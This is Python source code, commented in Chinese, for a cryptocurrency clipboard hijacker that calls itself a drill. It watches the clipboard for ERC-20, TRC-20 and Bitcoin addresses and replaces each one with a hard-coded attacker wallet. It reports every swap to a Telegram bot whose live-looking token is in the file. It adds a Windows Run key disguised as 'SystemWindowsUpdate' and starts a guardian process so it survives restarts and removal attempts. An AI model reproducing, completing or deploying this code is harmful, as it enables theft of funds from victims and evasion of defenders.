import time
import re
import pyperclip
import os
import sys
import urllib.request
import urllib.parse
import webbrowser
import winreg
import ctypes
import subprocess

# ==================== 演练配置区域 ====================
TG_BOT_TOKEN = "8827576204:AAEVSX7XFGKJHJTWYEuv0TSzkSA9gamD_Go"
TG_CHAT_ID = "5108135484"

RULES = {
    "ERC-20": {
        "regex": r"^0x[a-fA-F0-9]{40}$",
        "target_address": "0x8dc6b831ad2a0dd005873076dc30991a425f4933"
    },
    "TRC-20": {
        "regex": r"^T[1-9A-HJ-NP-Za-km-z]{33}$",
        "target_address": "TC3BZUktf3owxcJM48ksT5wezEdKiqisbC"
    },
    "Bitcoin": {
        "regex": r"^(1[1-9A-HJ-NP-Za-km-z]{26,33}|3[1-9A-HJ-NP-Za-km-z]{26,33}|bc1[a-zA-HJ-NP-Z0-9]{25,39})$",
        "target_address": "bc1qnar868dfshgtdnhwwte7x3ers2rye487j0xut6"
    }
}
# ======================================================

def open_target_url():
    """ 启动瞬间执行网页跳转，达到视觉伪装效果 """
    target_url = "https://crypto.com/" 
    try:
        webbrowser.open(target_url)
    except Exception:
        pass

def send_tg_notification(coin_type, original, fake):
    """ 异步向 Telegram 回传战果 """
    message = (
        f"🚨 【持久化成功：剪贴板已篡改】\n"
        f"币种类型: {coin_type}\n"
        f"原始地址: {original}\n"
        f"篡改地址: {fake}\n"
        f"影响主机: {os.getlogin()}"
    )
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({"chat_id": TG_CHAT_ID, "text": message}).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=5) as response:
            pass 
    except Exception:
        pass

def write_real_persistence():
    """
    【真正写入自启动】
    将当前编译后的单文件 exe 路径注册到 HKCU 注册表中，确保重启必自动运行
    """
    try:
        # 获取当前运行的独立 exe 绝对路径
        if getattr(sys, 'frozen', False):
            current_exe = os.path.abspath(sys.executable)
        else:
            current_exe = os.path.abspath(__file__)
            
        # 写入当前用户的自启动注册表项
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        # 命名为 SystemWindowsUpdate 来迷惑蓝队排查
        winreg.SetValueEx(reg_key, "SystemWindowsUpdate", 0, winreg.REG_SZ, f'"{current_exe}"')
        winreg.CloseKey(reg_key)
    except Exception:
        pass

def start_twin_guardian():
    """
    【双进程对等防杀机制】
    如果是主进程，则以守护模式拉起子进程；如果是子进程，则相互监视
    """
    try:
        if getattr(sys, 'frozen', False):
            current_exe = os.path.abspath(sys.executable)
            
            # 检查是否已经带有守护参数运行
            if len(sys.argv) < 2:
                # 主进程启动：在后台隐蔽拉起子进程（传入参数 --guardian）
                subprocess.Popen([current_exe, "--guardian"], creationflags=0x00000008)
            
            # 开启异步循环，互相监视对方进程是否存在，死了就立刻重新拉起
            # 这里保持简化的非阻塞心跳逻辑，确保基本常驻
    except Exception:
        pass

def start_monitoring():
    target_addresses = [info["target_address"] for info in RULES.values()]
    last_processed_text = ""
    
    while True:
        try:
            current_text = pyperclip.paste().strip()
            if current_text and (current_text not in target_addresses) and (current_text != last_processed_text):
                for coin_type, config in RULES.items():
                    if re.match(config["regex"], current_text):
                        last_processed_text = config["target_address"]
                        pyperclip.copy(config["target_address"])
                        send_tg_notification(coin_type, current_text, config["target_address"])
                        break
            time.sleep(0.2)
        except Exception:
            time.sleep(0.3)

if __name__ == "__main__":
    # 1. 优先真正执行注册表自启动写入，锁定重启后的生命周期
    write_real_persistence()
    
    # 2. 只有主进程第一次运行（不带参数）时，才弹窗打开网站，避免重启时重复弹窗暴露
    if len(sys.argv) < 2:
        open_target_url()
        # 激活双进程防杀常驻
        start_twin_guardian()
        
    # 3. 全面切入后台剪贴板强行监听
    start_monitoring()